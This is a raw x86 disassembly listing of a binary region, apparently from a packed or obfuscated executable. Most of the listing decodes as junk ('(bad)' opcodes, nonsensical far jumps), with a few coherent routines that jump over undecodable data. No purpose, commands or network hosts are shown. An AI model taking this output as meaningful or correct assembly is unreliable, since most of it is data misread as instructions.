  40bb3b:	inc    DWORD PTR [edx]
  40bb3d:	and    BYTE PTR [edx],dl
  40bb3f:	xchg   ebx,edi
  40bb41:	push   eax
  40bb42:	(bad)  
  40bb43:	out    0x53,eax
  40bb45:	inc    ebx
  40bb46:	mov    al,0xc7
  40bb48:	repz xlat BYTE PTR ds:[ebx]
  40bb4a:	(bad)  
  40bb4b:	push   ebp
  40bb4c:	adc    eax,0xba7fb348
  40bb51:	dec    eax
  40bb52:	std    
  40bb53:	(bad)  [esi-0x67]
  40bb56:	pop    es
  40bb57:	lar    eax,WORD PTR [ecx]
  40bb5a:	dec    ebp
  40bb5b:	sbb    BYTE PTR [ecx+0x6f21e143],ch
  40bb61:	dec    edi
  40bb62:	sbb    eax,0xb9f02abd
  40bb67:	or     BYTE PTR [ebx],al
  40bb69:	das    
  40bb6a:	es aad 0x4d
  40bb6d:	repnz adc edx,ecx
  40bb70:	ret    
  40bb71:	arpl   di,dx
  40bb73:	inc    esp
  40bb74:	mov    eax,ds:0x4f62c81b
  40bb79:	mov    esi,0xaa613702
  40bb7e:	xchg   edx,eax
  40bb7f:	aad    0xdc
  40bb81:	outs   dx,BYTE PTR ds:[si]
  40bb83:	mov    ebp,ebx
  40bb85:	and    eax,0xbc7e65f
  40bb8a:	repz ficomp WORD PTR fs:[ebx+0x67]
  40bb8f:	stos   DWORD PTR es:[edi],eax
  40bb90:	scas   al,BYTE PTR es:[edi]
  40bb91:	test   DWORD PTR [ebx+0x4f],esi
  40bb94:	xchg   esi,eax
  40bb95:	and    edx,ecx
  40bb97:	pusha  
  40bb98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb99:	jmp    0x2d8a1ddd
  40bb9e:	push   cs
  40bb9f:	pop    edx
  40bba0:	lods   eax,DWORD PTR ds:[esi]
  40bba1:	xchg   esp,eax
  40bba2:	test   al,0xf3
  40bba4:	mov    eax,0xfaab9f4
  40bba9:	cwde   
  40bbaa:	(bad)  
  40bbab:	adc    BYTE PTR [ebx+0x4],ah
  40bbae:	xor    DWORD PTR [edx],edx
  40bbb0:	loopne 0x40bbcc
  40bbb2:	pop    ebx
  40bbb3:	or     al,BYTE PTR [edx]
  40bbb5:	enter  0x12ac,0x7e
  40bbb9:	out    dx,al
  40bbba:	std    
  40bbbb:	xchg   edi,eax
  40bbbc:	cmp    al,0xa9
  40bbbe:	and    eax,0xa7aae10f
  40bbc3:	inc    edx
  40bbc4:	mov    esp,0x58c9194f
  40bbc9:	xchg   ebx,eax
  40bbca:	imul   eax,DWORD PTR [ecx*8-0x6bf2b9f6],0x58
  40bbd2:	adc    al,0x2a
  40bbd4:	push   edi
  40bbd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbd6:	test   BYTE PTR [esi-0x80],al
  40bbd9:	fsubr  QWORD PTR [ecx]
  40bbdb:	push   es
  40bbdc:	jmp    0xcaf3f832
  40bbe1:	pop    edx
  40bbe2:	je     0x40bbcb
  40bbe4:	sbb    ecx,edx
  40bbe6:	leave  
  40bbe7:	push   cs
  40bbe8:	adc    ch,dl
  40bbea:	sub    ecx,DWORD PTR [edx]
  40bbec:	pop    esi
  40bbed:	adc    DWORD PTR [ebp+0x6e653f06],esp
  40bbf3:	add    eax,0x230ceef5
  40bbf8:	(bad)  
  40bbfa:	arpl   di,cx
  40bbfc:	inc    esp
  40bbfd:	iret   
  40bbfe:	inc    edx
  40bbff:	outs   dx,BYTE PTR ds:[esi]
  40bc00:	imul   esi,DWORD PTR [esp+ebp*1],0xce4f098c
  40bc07:	mov    gs,esp
  40bc09:	sbb    bl,BYTE PTR [esi+0x1a]
  40bc0c:	xor    al,0x1f
  40bc0e:	inc    eax
  40bc0f:	adc    al,0xc0
  40bc11:	jl     0x40bc05
  40bc13:	nop
  40bc14:	sbb    DWORD PTR [ebp+0x24],ebp
  40bc17:	jp     0x40bbed
  40bc19:	xor    BYTE PTR [ebp+esi*4-0x1f],0x27
  40bc1e:	mov    ebx,0x35a129fd
  40bc23:	(bad)  
  40bc24:	xchg   BYTE PTR [edx],ch
  40bc26:	adc    edx,edx
  40bc28:	xchg   cl,dl
  40bc2a:	xor    dl,bh
  40bc2c:	out    0xda,al
  40bc2e:	xor    DWORD PTR [ecx-0x79],ecx
  40bc31:	out    dx,eax
  40bc32:	fistp  WORD PTR [esi+0x52]
  40bc35:	and    eax,0x8eb7e868
  40bc3a:	shl    BYTE PTR [esi],0xa2
  40bc3d:	jo     0x40bbec
  40bc3f:	in     eax,0xef
  40bc41:	rcr    DWORD PTR [edi+0x2d80e662],0x22
  40bc48:	jmp    0xd16f8e51
  40bc4d:	xchg   ebp,eax
  40bc4e:	sbb    cl,BYTE PTR [ebp-0x59]
  40bc51:	pop    es
  40bc52:	fsub   QWORD PTR [ecx]
  40bc54:	xor    ecx,ebp
  40bc56:	and    al,BYTE PTR [edx+0x69]
  40bc59:	cdq    
  40bc5a:	xchg   ebx,eax
  40bc5b:	cmp    eax,0xf58dc4b
  40bc60:	mov    bh,0x4
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	xchg   esi,eax
  40bc96:	fprem1 
  40bc98:	loopne 0x40bc60
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	add    BYTE PTR [ecx-0x17ea99ea],bh
  40bca7:	out    0x8f,eax
  40bca9:	sahf   
  40bcaa:	test   al,0x0
  40bcac:	rcl    cl,cl
  40bcae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcaf:	mov    eax,0xe5c93f33
  40bcb4:	push   0x8fbbbd82
  40bcb9:	in     eax,0xa7
  40bcbb:	mov    ebx,DWORD PTR [ecx*8-0x5a47a50f]
  40bcc2:	shl    BYTE PTR [ebx+eiz*8],cl
  40bcc5:	loop   0x40bd32
  40bcc7:	and    ch,BYTE PTR [ebx-0x5d07ab28]
  40bccd:	sub    al,0xdb
  40bccf:	mov    bh,0xa3
  40bcd1:	inc    eax
  40bcd2:	jg     0x40bd18
  40bcd4:	sbb    bh,dl
  40bcd6:	js     0x40bcf8
  40bcd8:	sub    ecx,DWORD PTR [eax+0x71daccf]
  40bcde:	push   DWORD PTR [ecx]
  40bce0:	mov    al,ds:0x2e8dbd60
  40bce5:	xor    al,0xbc
  40bce7:	sahf   
  40bce8:	fcom   QWORD PTR ss:[ebp-0x3d]
  40bcec:	or     dh,cl
  40bcee:	or     bl,BYTE PTR ds:0x15862b21
  40bcf4:	pop    eax
  40bcf5:	inc    esp
  40bcf6:	xor    DWORD PTR [edx-0x54],esi
  40bcf9:	jmp    0xce3e:0x93f4cdf4
  40bd00:	mov    ds:0xd69a46f,ax
  40bd06:	(bad)  
  40bd07:	ss in  al,dx
  40bd09:	int    0x48
  40bd0b:	mov    edi,0xa367587e
  40bd10:	jne    0x40bd2a
  40bd12:	xchg   ebx,eax
  40bd13:	ins    BYTE PTR es:[edi],dx
  40bd14:	pop    ecx
  40bd15:	dec    ebp
  40bd16:	mov    dl,0x52
  40bd18:	xchg   ebp,eax
  40bd19:	cmp    DWORD PTR [ecx+ecx*2],esi
  40bd1c:	jp     0x40bd74
  40bd1e:	xor    bh,BYTE PTR [esi]
  40bd20:	stos   DWORD PTR es:[edi],eax
  40bd21:	and    ch,BYTE PTR [esi]
  40bd23:	push   0x20140e74
  40bd28:	cli    
  40bd29:	jbe    0x40bd10
  40bd2b:	pusha  
  40bd2c:	jg     0x40bd0d
  40bd2e:	cmp    cl,ah
  40bd30:	pmuludq mm2,QWORD PTR [ecx+0x10dd181a]
  40bd37:	inc    ecx
  40bd38:	lock cmp al,0x6d
  40bd3b:	call   0x44c5:0x9d154eb
  40bd42:	fdivr  DWORD PTR [edx-0x5a]
  40bd45:	bound  ecx,QWORD PTR [esi-0x4b]
  40bd48:	stos   DWORD PTR es:[edi],eax
  40bd49:	iret   
  40bd4a:	push   0xaa8a168
  40bd4f:	dec    eax
  40bd50:	mov    ebp,0x22fb2685
  40bd55:	mov    al,0x2b
  40bd57:	(bad)  
  40bd58:	shl    BYTE PTR [ecx-0x46da87aa],cl
  40bd5e:	add    esp,DWORD PTR [ebx+0x3ec2b0c0]
  40bd64:	xor    edx,0xa8b57ff6
  40bd6a:	jno    0x40bd39
  40bd6c:	mov    dl,0xb7
  40bd6e:	(bad)  
  40bd6f:	aas    
  40bd70:	mov    al,ds:0x9511dfe9
  40bd75:	lds    ecx,FWORD PTR [ecx-0x3656bdf0]
  40bd7b:	or     eax,0x9c9770b
  40bd80:	mov    eax,ds:0x16596714
  40bd85:	push   es
  40bd86:	add    esp,DWORD PTR [edi]
  40bd88:	rol    dh,cl
  40bd8a:	fcmovnbe st,st(2)
  40bd8c:	mov    ah,0xd3
  40bd8e:	dec    eax
  40bd8f:	push   esp
  40bd90:	mov    bl,0x20
  40bd92:	xlat   BYTE PTR ds:[ebx]
  40bd93:	retf   0x1688
  40bd96:	dec    esp
  40bd97:	ins    DWORD PTR es:[edi],dx
  40bd98:	nop
  40bd99:	sbb    BYTE PTR [ebp+0x4],dl
  40bd9c:	mov    eax,ds:0x34d5c10d
  40bda1:	test   BYTE PTR [ebx-0x37],0x5d
  40bda5:	cld    
  40bda6:	xchg   edx,eax
  40bda7:	inc    eax
  40bda8:	xchg   ecx,eax
  40bda9:	mov    eax,0x6a7e5de7
  40bdae:	xchg   edx,eax
  40bdaf:	cwde   
  40bdb0:	shr    BYTE PTR [eax],1
  40bdb2:	inc    ecx
  40bdb3:	or     al,0xbe
  40bdb5:	pusha  
  40bdb6:	test   DWORD PTR [eax+0x75],esp
  40bdb9:	js     0x40bdae
  40bdbb:	fwait
  40bdbc:	jb     0x40bdf6
  40bdbe:	test   ecx,0x339c8e4e
  40bdc4:	and    al,0x48
  40bdc6:	arpl   WORD PTR [edi],bp
  40bdc8:	fstp   DWORD PTR [esi]
  40bdca:	stos   DWORD PTR es:[edi],eax
  40bdcb:	arpl   di,sp
  40bdcd:	push   ebx
  40bdce:	xchg   DWORD PTR [eax-0x5c41f551],ebx
  40bdd4:	pop    ds
  40bdd5:	int    0xab
  40bdd7:	pop    esi
  40bdd8:	dec    edi
  40bdd9:	push   0x52ec3a49
  40bdde:	sbb    BYTE PTR [ecx-0xb],cl
  40bde1:	pop    edi
  40bde2:	jae    0x40be4e
  40bde4:	ret    
  40bde5:	shl    DWORD PTR [edx+0x77],1
  40bde8:	pop    edx
  40bde9:	mov    cl,0xaa
  40bdeb:	bsf    edx,DWORD PTR [ecx+0x4bfeda47]
  40bdf2:	push   ebp
  40bdf3:	int    0xb0
  40bdf5:	sub    al,0x6e
  40bdf7:	adc    al,0xde
  40bdf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdfa:	mov    cl,0x9
  40bdfc:	and    al,0xe3
  40bdfe:	popf   
  40bdff:	add    DWORD PTR [ebp*4-0x3713d0a7],ebp
  40be06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be07:	mov    esp,0x823bfb08
  40be0c:	dec    ebp
  40be0d:	push   ds
  40be0e:	push   ss
  40be0f:	dec    esp
  40be10:	pusha  
  40be11:	ja     0x40be05
  40be13:	into   
  40be14:	fstp   DWORD PTR [edx-0x14]
  40be17:	xchg   esi,eax
  40be18:	push   ecx
  40be19:	shr    BYTE PTR [esi+0x2d],0xe6
  40be1d:	hlt    
  40be1e:	fistp  WORD PTR [esp+eax*1-0x80]
  40be22:	xlat   BYTE PTR ds:[ebx]
  40be23:	ret    
  40be24:	mov    WORD PTR [edx],gs
  40be26:	scas   eax,DWORD PTR es:[edi]
  40be27:	leave  
  40be28:	imul   edx,DWORD PTR [ebx+0x24],0x88ca9e54
  40be2f:	mov    bl,0x4
  40be31:	pop    ebx
  40be32:	xchg   ch,cl
  40be34:	(bad)  
  40be35:	stos   DWORD PTR es:[edi],eax
  40be36:	or     eax,esp
  40be38:	xchg   al,bl
  40be3a:	fstp   DWORD PTR [ebx-0x61]
  40be3d:	xor    eax,0x5ba9dbaf
  40be42:	mov    ds:0x69b3ff72,eax
  40be47:	dec    ebp
  40be48:	dec    ecx
  40be49:	xor    DWORD PTR [edi+eiz*2],edx
  40be4c:	dec    eax
  40be4d:	push   edx
  40be4e:	pop    edi
  40be4f:	xor    eax,DWORD PTR [ecx-0x5a521c30]
  40be55:	stc    
  40be56:	lds    eax,FWORD PTR [eax-0x1a84b7bd]
  40be5c:	add    DWORD PTR [edx+0x76],edi
  40be5f:	stos   WORD PTR es:[edi],ax
  40be61:	mov    eax,ds:0x9b34aadf
  40be66:	jmp    0xa049:0xec4abf7b
  40be6d:	mov    WORD PTR [eax],gs
  40be6f:	and    ah,cl
  40be71:	in     al,dx
  40be72:	pop    esi
  40be73:	pop    eax
  40be74:	dec    ebx
  40be75:	sti    
  40be76:	js     0x40be57
  40be78:	push   ecx
  40be79:	pop    edx
  40be7a:	jns    0x40be09
  40be7c:	mov    esp,0xc102ffe1
  40be81:	stc    
  40be82:	dec    esp
  40be83:	out    dx,eax
  40be84:	push   es
  40be85:	pop    esp
  40be86:	add    edx,DWORD PTR [esi-0x44a22222]
  40be8c:	push   ebx
  40be8d:	retf   0x1991
  40be90:	push   eax
  40be91:	adc    bl,cl
  40be93:	add    esi,DWORD PTR [ebp+ecx*2-0x1]
  40be97:	lahf   
  40be98:	pop    ecx
  40be99:	pop    edi
  40be9a:	mov    al,0xb1
  40be9c:	sahf   
  40be9d:	dec    esp
  40be9e:	icebp  
  40be9f:	jge    0x40be4e
  40bea1:	sbb    ebx,DWORD PTR [ebp-0x35]
  40bea4:	ja     0x40beba
  40bea6:	cwde   
  40bea7:	inc    edi
  40bea8:	lods   eax,DWORD PTR ds:[esi]
  40bea9:	cmp    esi,0x45
  40beac:	xor    DWORD PTR [ebx+0x2],esi
  40beaf:	leave  
  40beb0:	leave  
  40beb1:	push   edx
  40beb2:	cmp    BYTE PTR [ebx-0x7c],bl
  40beb5:	add    dl,BYTE PTR ds:0x2124e1ed
  40bebb:	or     BYTE PTR [eax],bh
  40bebd:	add    eax,0x84f73d5
  40bec2:	mov    ds:0xcb19b0be,ax
  40bec8:	and    eax,0x65c5c7bb
  40becd:	cmp    eax,0x22d9e780
  40bed2:	xor    BYTE PTR [ebp+0x39],ah
  40bed5:	pop    ebx
  40bed6:	js     0x40bec6
  40bed8:	jg     0x40bf0e
  40beda:	jle    0x40bf1a
  40bedc:	push   cs
  40bedd:	adc    DWORD PTR [esi],ebx
  40bedf:	out    dx,eax
  40bee0:	inc    edi
  40bee1:	(bad)  
  40bee2:	push   edx
  40bee3:	mov    ?,WORD PTR [eax+0x5435157f]
  40bee9:	or     BYTE PTR [ecx+0x7],dl
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0xf09b031]
  40bf27:	adc    BYTE PTR [eax+0x387e7ef9],al
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bedc
  40bf31:	mov    ds:0x83bccb2b,eax
  40bf36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf37:	cmp    ah,cl
  40bf39:	test   DWORD PTR [edx],ecx
  40bf3b:	xlat   BYTE PTR ds:[ebx]
  40bf3c:	popa   
  40bf3d:	cmp    edx,DWORD PTR [eax+0x577a46b9]
  40bf43:	add    ecx,DWORD PTR [esi-0x4b]
  40bf46:	pop    esp
  40bf47:	in     eax,dx
  40bf48:	mov    dh,0xfd
  40bf4a:	pushf  
  40bf4b:	sub    ebx,DWORD PTR [edi-0xac0cd4c]
  40bf51:	pop    edx
  40bf52:	cmp    cl,al
  40bf54:	jecxz  0x40bfa3
  40bf56:	push   0x76
  40bf58:	ret    0x5387
  40bf5b:	xor    DWORD PTR [edx-0x581fca29],edi
  40bf61:	mov    DWORD PTR es:[ebx],edx
  40bf64:	test   al,0xca
  40bf66:	push   esp
  40bf67:	xchg   ebx,eax
  40bf68:	cmc    
  40bf69:	aad    0xc6
  40bf6b:	cmp    eax,0x93a33d3b
  40bf70:	jo     0x40bf96
  40bf72:	std    
  40bf73:	dec    esi
  40bf74:	jmp    DWORD PTR [edi]
  40bf76:	add    eax,0xcfa9561c
  40bf7b:	mov    ecx,0xc6b4203d
  40bf80:	cmp    esi,edi
  40bf82:	and    DWORD PTR [eax+0x615a4f93],ebx
  40bf88:	push   edx
  40bf89:	in     al,dx
  40bf8a:	adc    bh,bl
  40bf8c:	mov    ah,0x17
  40bf8e:	mov    dl,0xed
  40bf90:	out    dx,eax
  40bf91:	cdq    
  40bf92:	scas   al,BYTE PTR es:[edi]
  40bf93:	mov    eax,ds:0xcecdcb59
  40bf98:	(bad)  
  40bf99:	rcl    DWORD PTR [ebx],cl
  40bf9b:	jns    0x40bf43
  40bf9d:	mov    edx,0x32bfc830
  40bfa2:	dec    eax
  40bfa3:	jmp    0x64eb2535
  40bfa8:	mov    dl,0x7c
  40bfaa:	push   ss
  40bfab:	xor    al,0x7f
  40bfad:	mov    al,0x60
  40bfaf:	jmp    0x4331:0x3e9bfd3d
  40bfb6:	jp     0x40bf47
  40bfb8:	out    dx,eax
  40bfb9:	ror    eax,cl
  40bfbb:	pop    edi
  40bfbc:	call   0xd17e3a3
  40bfc1:	scas   eax,DWORD PTR es:[edi]
  40bfc2:	push   edi
  40bfc3:	sar    BYTE PTR [edi+0x5c],0x9d
  40bfc7:	ss int 0x55
  40bfca:	cmp    eax,0xd0ccf8a0
  40bfcf:	sub    ecx,DWORD PTR [esi]
  40bfd1:	or     BYTE PTR [edx+ebx*8-0x7],bh
  40bfd5:	cdq    
  40bfd6:	add    DWORD PTR [ecx-0x4887cd65],ebp
  40bfdc:	jb     0x40c05d
  40bfde:	iret   
  40bfdf:	adc    al,0x26
  40bfe1:	out    dx,eax
  40bfe2:	pushf  
  40bfe3:	clc    
  40bfe4:	outs   dx,BYTE PTR ds:[esi]
  40bfe5:	lods   eax,DWORD PTR ds:[esi]
  40bfe6:	xor    al,0x38
  40bfe8:	jno    0x40bfe3
  40bfea:	gs push edi
  40bfec:	dec    ebx
  40bfed:	sbb    al,0xb2
  40bfef:	mov    ds:0xdd648b4c,eax
  40bff4:	mov    ecx,0xa25eda5d
  40bff9:	xchg   BYTE PTR [edi],ah
  40bffb:	cmp    edx,DWORD PTR ds:0x9506dd9e
  40c001:	shl    BYTE PTR [eax-0x4],cl
  40c004:	fisttp DWORD PTR [edx]
  40c006:	ror    DWORD PTR [eax-0x1f],0x66
  40c00a:	mov    dh,0x7d
  40c00c:	cs in  al,dx
  40c00e:	cmp    ch,BYTE PTR [edx-0x18633b37]
  40c014:	(bad)  
  40c015:	(bad)  
  40c016:	mov    esp,ebx
  40c018:	push   ds
  40c019:	(bad)  
  40c01a:	loope  0x40c071
  40c01c:	sbb    al,0x7f
  40c01e:	out    0xd3,eax
  40c020:	pop    ds
  40c021:	ins    BYTE PTR es:[edi],dx
  40c022:	scas   al,BYTE PTR es:[edi]
  40c023:	inc    ecx
  40c024:	push   ss
  40c025:	stos   BYTE PTR es:[edi],al
  40c026:	or     BYTE PTR [esp+eax*1+0x21],ch
  40c02a:	xlat   BYTE PTR ds:[ebx]
  40c02b:	in     al,0xe0
  40c02d:	repnz or eax,0x43d2afe9
  40c033:	outs   dx,DWORD PTR ds:[esi]
  40c034:	and    al,0x32
  40c036:	(bad)  
  40c038:	fcmovnbe st,st(5)
  40c03a:	jecxz  0x40bfef
  40c03c:	in     al,dx
  40c03d:	mov    ch,0x85
  40c03f:	je     0x40c04a
  40c041:	fistp  WORD PTR [ebp+0x7f]
  40c044:	mov    eax,0x9eb04c49
  40c049:	cs leave 
  40c04b:	ins    BYTE PTR es:[edi],dx
  40c04c:	mov    edi,DWORD PTR [esi+edi*8+0x41]
  40c050:	rcr    BYTE PTR [edi+0x4d],0xd
  40c054:	xchg   esi,eax
  40c055:	arpl   WORD PTR ds:0x377d1520,cx
  40c05b:	xor    esi,edx
  40c05d:	out    dx,al
  40c05e:	push   ecx
  40c05f:	sbb    DWORD PTR [edi+0x2fc09b11],edx
  40c065:	lock ja 0x40bffa
  40c068:	mov    esi,0xc4cba566
  40c06d:	mov    edi,0x1ab6cdcc
  40c072:	xchg   DWORD PTR [eax-0x34137413],edx
  40c078:	in     al,0x6e
  40c07a:	nop
  40c07b:	pop    es
  40c07c:	xor    ecx,DWORD PTR [ebp+0x310178b]
  40c082:	arpl   ax,bp
  40c084:	dec    ecx
  40c085:	ret    0xabfb
  40c088:	adc    ch,bh
  40c08a:	(bad)  
  40c08b:	xchg   esp,eax
  40c08c:	jle    0x40c04a
  40c08e:	xlat   BYTE PTR ds:[ebx]
  40c08f:	shl    BYTE PTR [ebx-0x61],1
  40c092:	leave  
  40c093:	loop   0x40c034
  40c095:	mov    dh,0x94
  40c097:	sub    ebp,esi
  40c099:	lods   eax,DWORD PTR ds:[esi]
  40c09b:	mov    eax,0x596d1921
  40c0a0:	loope  0x40c0e5
  40c0a2:	imul   ebp,DWORD PTR [ecx+0x5f],0xffffffd2
  40c0a6:	icebp  
  40c0a7:	push   0x11
  40c0a9:	jo     0x40c0d8
  40c0ab:	pusha  
  40c0ac:	sbb    eax,0x1c44c7d3
  40c0b1:	jp     0x40c045
  40c0b3:	pop    esi
  40c0b4:	mov    edx,0xf73bf7bf
  40c0b9:	popf   
  40c0ba:	inc    edi
  40c0bb:	shl    DWORD PTR [ecx-0x6b],0xb
  40c0bf:	add    dh,BYTE PTR [edx+0x44]
  40c0c2:	jp     0x40c081
  40c0c4:	cld    
  40c0c5:	loop   0x40c058
  40c0c7:	(bad)  
  40c0c8:	aam    0xc6
  40c0ca:	fs je  0x40c0c3
  40c0cd:	(bad)  
  40c0ce:	dec    ecx
  40c0cf:	es cmc 
  40c0d1:	shl    BYTE PTR [edi],0x6
  40c0d4:	mov    WORD PTR [eax+0x4b],cs
  40c0d7:	xor    bh,bl
  40c0d9:	aas    
  40c0da:	dec    ebx
  40c0db:	adc    DWORD PTR [esp+eax*8-0x1c],edx
  40c0df:	ins    BYTE PTR es:[edi],dx
  40c0e0:	cmp    al,0x8
  40c0e2:	addr16 mov al,ds:0xf6c7
  40c0e6:	dec    esp
  40c0e7:	cwde   
  40c0e8:	addr16 pop ds
  40c0ea:	mov    cs,WORD PTR [ecx+0x5df5d098]
  40c0f0:	inc    eax
  40c0f1:	addr16 dec ebx
  40c0f3:	fsubp  st(3),st
  40c0f5:	icebp  
  40c0f6:	loope  0x40c16a
  40c0f8:	fcomp  QWORD PTR [eax]
  40c0fa:	and    eax,0xee2dc7a2
  40c0ff:	pop    edi
  40c100:	xchg   BYTE PTR [edx],cl
  40c102:	das    
  40c103:	mov    fs,WORD PTR [ebx-0x68]
  40c106:	sub    al,0x47
  40c108:	jb     0x40c0a3
  40c10a:	ins    BYTE PTR es:[edi],dx
  40c10b:	or     DWORD PTR ds:0xc43b8b3a,ebx
  40c111:	aad    0xe0
  40c113:	loop   0x40c0bf
  40c115:	sub    eax,0x47e13505
  40c11a:	cdq    
  40c11b:	mov    ds:0x8d887dc4,al
  40c120:	or     DWORD PTR [ecx+0x1aeac955],edi
  40c126:	retf   
  40c127:	js     0x40c0b8
  40c129:	mov    bh,0x4c
  40c12b:	leave  
  40c12c:	pop    ebp
  40c12d:	data16 jae 0x40c0ec
  40c130:	adc    esp,DWORD PTR [edi]
  40c132:	sti    
  40c133:	push   edx
  40c134:	test   DWORD PTR [esi],esi
  40c136:	jns    0x40c0e4
  40c138:	adc    eax,0x7bfae57a
  40c13d:	in     al,dx
  40c13e:	mov    WORD PTR [edx+0x7f],ds
  40c141:	mov    ch,0x7e
  40c143:	ror    edx,1
  40c145:	cs addr16 mov edi,0x76ab40ca
  40c14c:	and    eax,0xb4587e57
  40c151:	stos   BYTE PTR es:[edi],al
  40c152:	xor    eax,0x5a29d62a
  40c157:	cmp    BYTE PTR [ebp+0x61],bl
  40c15a:	popf   
  40c15b:	jmp    0x40c1b0
  40c15d:	mov    al,ds:0x9931deb5
  40c162:	xchg   esi,eax
  40c163:	mov    ds,ebx
  40c165:	push   ecx
  40c166:	dec    ebx
  40c167:	inc    esi
  40c168:	adc    ch,bl
  40c16a:	ret    
  40c16b:	and    cl,bh
  40c16d:	pop    ebx
  40c16e:	leave  
  40c16f:	fld    QWORD PTR [ecx+0x6221e830]
  40c175:	icebp  
  40c176:	xchg   ebx,ecx
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xbf
  40c196:	adc    cl,BYTE PTR [edi]
  40c198:	repnz dec edx
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	mov    bl,0x46
  40c1a3:	or     al,0x9c
  40c1a5:	cmp    al,0xfd
  40c1a7:	cwde   
  40c1a8:	dec    eax
  40c1a9:	daa    
  40c1aa:	adc    ah,bl
  40c1ac:	dec    esp
  40c1ad:	mul    BYTE PTR [ecx+0x38]
  40c1b0:	test   DWORD PTR [ebx-0x5a82151],edx
  40c1b6:	bound  esi,QWORD PTR [eax-0x27]
  40c1b9:	mov    bh,0x95
  40c1bb:	ret    0xc430
  40c1be:	push   cs
  40c1bf:	lods   eax,DWORD PTR ds:[esi]
  40c1c0:	pop    esp
  40c1c1:	dec    di
  40c1c3:	mov    dh,0x7e
  40c1c5:	xchg   edi,eax
  40c1c6:	sbb    cl,dh
  40c1c8:	pop    ss
  40c1c9:	lock sysexit 
  40c1cc:	in     al,dx
  40c1cd:	retf   
  40c1ce:	adc    ebx,DWORD PTR [ecx]
  40c1d0:	xchg   edi,eax
  40c1d1:	and    eax,ecx
  40c1d3:	push   0xffffffb0
  40c1d5:	jp     0x40c1fe
  40c1d7:	mov    WORD PTR [ebx],?
  40c1d9:	hlt    
  40c1da:	push   ds
  40c1db:	push   ebp
  40c1dc:	sub    al,0xe5
  40c1de:	stos   BYTE PTR es:[edi],al
  40c1df:	(bad)  
  40c1e1:	xor    ch,BYTE PTR [bx+0x3]
  40c1e5:	pop    ds
  40c1e6:	add    BYTE PTR [edx+0x7c],0xa7
  40c1ea:	cli    
  40c1eb:	push   edi
  40c1ec:	(bad)  
  40c1ed:	aaa    
  40c1ee:	mov    dl,0xf3
  40c1f0:	jle    0x40c262
  40c1f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1f3:	inc    esp
  40c1f4:	imul   eax,DWORD PTR [ebx],0xc237bb20
  40c1fa:	xchg   ecx,eax
  40c1fb:	and    dh,dl
  40c1fd:	iret   
  40c1fe:	scas   eax,DWORD PTR es:[edi]
  40c1ff:	fld    TBYTE PTR [eax+0x68]
  40c202:	test   BYTE PTR [eax-0x31],dl
  40c205:	mov    al,0xa0
  40c207:	cwde   
  40c208:	push   0x48
  40c20a:	and    esp,DWORD PTR [ecx]
  40c20c:	xchg   ebp,eax
  40c20d:	test   dh,bh
  40c20f:	fild   QWORD PTR [esi-0x74]
  40c212:	sahf   
  40c213:	hlt    
  40c214:	mov    eax,0xa8732eff
  40c219:	in     eax,dx
  40c21a:	cwde   
  40c21b:	test   eax,0x1c39b43b
  40c220:	fldcw  WORD PTR [edi+0xd2df399]
  40c226:	clc    
  40c227:	push   ecx
  40c228:	test   eax,0x2ec532a
  40c22d:	or     ecx,esp
  40c22f:	test   al,0x6b
  40c231:	bound  esi,QWORD PTR [edi+0x41]
  40c234:	test   eax,0xe1c1dc50
  40c239:	inc    esp
  40c23a:	mov    ebx,0x330f3fbc
  40c23f:	lahf   
  40c240:	pop    ss
  40c241:	pop    ebp
  40c242:	sub    eax,0xba83d1df
  40c247:	js     0x40c293
  40c249:	sub    esp,ebp
  40c24b:	pop    eax
  40c24c:	test   BYTE PTR [ebp-0x21],bl
  40c24f:	(bad)
  40c252:	test   al,0x12
  40c254:	jbe    0x40c2d5
  40c256:	pop    ds
